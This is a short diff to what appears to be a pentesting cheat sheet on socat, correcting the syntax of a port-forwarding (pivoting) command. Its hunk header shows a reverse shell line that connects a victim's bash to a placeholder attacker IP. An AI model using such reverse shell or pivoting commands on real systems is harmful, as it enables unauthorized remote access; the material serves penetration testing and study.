@@ -178,7 +178,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ### Port2Port
 
 ```bash
-socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>,<rport> &
+socat TCP-LISTEN:<lport>,fork TCP:<redirect_ip>:<rport> &
 ```
 
 ### Port2Port through socks
